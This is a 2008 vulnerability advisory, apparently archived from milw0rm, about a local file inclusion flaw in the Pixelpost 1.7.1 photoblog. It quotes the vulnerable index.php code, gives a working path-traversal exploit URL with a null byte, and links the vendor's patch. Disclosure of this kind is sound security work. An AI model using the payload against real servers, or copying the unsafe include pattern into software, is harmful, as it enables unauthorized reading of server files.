@@ -1,0 +1,91 @@
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-033
+
+
+Application:                    Pixelpost photoblog
+Versions Affected:              1.7.1
+Vendor URL:                     http://www.pixelpost.org/
+Bug:                            Local File Include
+Exploits:                       YES
+Reported:                       22.07.2008
+Vendor response:                23.07.2008
+Solution:                       YES
+Date of Public Advisory:        28.07.2008
+Authors:                        Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+Pixelpost photoblog has local file include vulnerability in script index.php
+
+Successful exploitation requires that "register_globals" is enabled.
+
+Code
+****
+#################################################
+
+$PP_supp_lang = array('dutch'=>array('NL','Nederlands'),
+                                          'english'=>array('EN','English'),
+                                          'french'=>array('FR','Francais'),
+                                          'german'=>array('DE','Deutsch'),
+                                          'italian'=>array('IT','Italiano'),
+                                          'norwegian'=>array('NO','Norsk'),
+                                          'persian'=>array('FA','Farsi'),
+                                          'polish'=>array('PL','Polskiego'),
+                                          'portuguese'=>array('PT','Portugues'),
+                                          'simplified_chinese'=>array('CN','Chinese'),
+                                          'spanish'=>array('ES','Espanol'),
+                                          'swedish'=>array('SE','Svenska'),
+                                          'danish'=>array('DK','Dansk'),
+                                          'japanese'=>array('JP','Japanese'),
+                                          'hungarian'=>array('HU','Magyar'),
+                                          'romanian'=>array('RO','Romana'),
+                                          'russian'=>array('RU','Russian'),
+                                          'czech'=>array('CS','Cesky')
+                                         );
+...
+if(isset($_GET['lang'])) { $language_abr = substr($_GET['lang'],0,2); }
+
+foreach ($PP_supp_lang as $key => $row) {
+        foreach($row as $cell){
+                if ($cell == strtoupper($language_abr)) { $language_full = $key; }
+        }
+}
+...
+if(!empty($language_full)) {
+        if(file_exists("language/lang-".$language_full.".php")) {
+
+                if( !isset($_GET['x'])OR($_GET['x'] != "rss" & $_GET['x'] != "atom")) {
+                        require("language/lang-".$language_full.".php");
+                }
+        }else{
+        ...
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/index.php?lang=DSecRG&language_full=../../../../../../../../../../../../../boot.ini%00
+
+
+
+Solution
+********
+
+Vendor fix this flaw on 27.07.2008. Security Patch can be downloaded here:
+
+http://www.pixelpost.org/blog/2008/07/27/pixelpost-171-security-patch/
+
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:    research [at] dsec [dot] ru
+            http://www.dsec.ru (in Russian)
+
+# milw0rm.com [2008-07-28]
